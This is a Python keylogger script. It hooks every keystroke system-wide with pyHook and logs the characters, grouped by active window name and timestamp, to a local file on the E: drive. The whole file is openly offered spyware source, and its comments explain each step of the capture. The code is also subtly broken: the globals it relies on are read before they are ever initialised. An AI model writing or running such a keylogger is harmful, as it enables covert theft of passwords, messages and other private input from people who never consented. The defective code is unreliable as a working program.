import pyHook, pythoncom, sys, logging

# Will store the logged keystrokes
file_log = 'E:/keyloggeroutput.txt'

# This function is triggered on each key event
def OnKeyboardEvent(event):
    global window_name  # Current active window name
    global time  # Last event time
    global keylog  # Holds the keylog data
    global file_log  # Log file path

    # Configure logging to append captured keystrokes to the specified file
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

    # Capture character from event
    char = chr(event.Ascii)

    # Check if the same window is active and the time interval is short
    if window_name == event.WindowName and event.Time - time < 10000:
        keylog += char  # Append keystroke to log if within 10 seconds
    else:
        window_name = event.WindowName  # Update window name
        time = event.Time  # Update last event time
        logging.log(10, keylog)  # Log the captured keystrokes
        # Structure the log to include window name and time
        keylog = 'Window Name: ' + str(window_name) + '::Time: ' + str(time) + '::LOG: ' + char

    return True  # Indicate that the event has been processed

# Set up the hook to start logging keystrokes
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

# Continuously capture keystrokes
try:
    pythoncom.PumpMessages()
except KeyboardInterrupt:
    logging.log(10, keylog)  # Ensure the final keylog data is logged
    print("Keylogger stopped.")
    sys.exit(0)